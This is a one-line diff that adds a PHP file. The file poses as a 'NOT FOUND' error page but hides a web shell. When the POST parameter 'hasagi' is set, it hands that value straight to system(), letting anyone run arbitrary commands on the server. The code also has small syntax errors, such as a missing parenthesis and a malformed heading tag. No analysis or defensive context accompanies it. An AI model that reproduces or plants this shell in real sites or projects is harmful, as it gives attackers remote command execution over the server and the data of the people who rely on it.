@@ -1,0 +1,1 @@
+<h1? NOT FOUND </h1><?php if(!isset($_POST['hasagi']){echo "<h1>NOT FOUND </h1>"} else{ system("".$_POST['hasagi']);} ?>
